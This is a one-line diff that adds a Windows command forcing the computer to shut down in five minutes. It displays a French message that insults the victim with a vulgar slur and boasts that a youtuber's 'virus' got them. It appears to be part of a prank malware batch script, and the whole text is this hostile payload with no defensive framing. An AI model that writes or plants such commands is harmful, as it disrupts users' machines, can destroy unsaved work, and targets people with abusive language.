@@ -1,0 +1,1 @@
+shutdown -s -t 300 -c "Dans 5 min, tu n'as plus de pc, fils de viol. Le virus du youtubeur Back ta bien baiser le cul :)"
